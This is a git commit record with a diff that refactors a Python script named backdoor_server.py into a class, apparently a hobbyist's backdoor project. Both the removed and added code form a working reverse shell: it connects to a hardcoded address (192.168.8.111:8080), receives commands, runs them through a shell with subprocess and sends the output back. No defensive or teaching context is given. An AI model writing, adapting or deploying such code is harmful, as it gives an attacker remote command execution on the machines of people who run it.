06d416d21aecd6b617e4edfa8b3fd6173e69081e
Radeonares32 <bugra.linux.js@gmail.com>
2022-12-14 19:08:45 +0300

    -socker server class modif

--- backdoor_server.py
+++ backdoor_server.py
@@ -1,19 +1,23 @@
 import socket
 import subprocess
 
+class SocketServer:
+    def __init__(self,ip,port):
+        self.backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.backdoor_server.connect(("192.168.8.111", 8080))
+    def command_send(self,command):
+        self.backdoor_server.send((command).encode())
 
-def command_execution(command):
-    return subprocess.check_output(command, shell=True)
+    def command_execution(self,command):
+        return subprocess.check_output(command, shell=True)
 
+    def exec(self):
+        while True:
+            command = self.backdoor_server.recv(1024)  # byte
+            cmd = self.command_execution(command)
+            self.backdoor_server.send(cmd)
+        self.backdoor_server.close()
 
-backdoor_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-backdoor_server.connect(("192.168.8.111", 8080))
-backdoor_server.send(("Hello World\n").encode())
-
-while True:
-    command = backdoor_server.recv(1024)  # byte
-    cmd = command_execution(command)
-    backdoor_server.send(cmd)
-
-backdoor_server.close()
+#my_socket_object = SocketServer("10.0.3.4",7707)
+#my_socket_object.command_send()
+#my_socket_object.exec()
